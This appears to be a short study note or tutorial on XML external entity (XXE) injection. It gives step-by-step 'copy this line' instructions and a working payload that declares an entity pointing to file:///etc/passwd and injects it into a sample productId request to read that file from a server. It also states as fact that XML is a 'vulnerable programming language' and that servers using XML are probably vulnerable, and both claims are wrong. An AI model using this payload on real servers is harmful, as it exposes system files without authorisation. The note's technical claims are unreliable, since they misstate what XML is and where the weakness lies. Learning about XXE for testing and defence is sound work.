XML is vulnerable programming language. when intercepting data,
if we notice that the server is using XML, it is probably vulnerable.


How to exploit?
Copy this line
<!ENTITY xxe SYSTEM "file:///etc/passwd" >

Paste it after the XXE openning
And change the existing variable to "&xxe;"

For example if we have
<?xml version="1.0" ?>
	<productId>
		4
	</productId>


We will edit it to
<?xml version="1.0" ?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<productId>
		&xxe;
	</productId>


it will read the file that is specified in the command
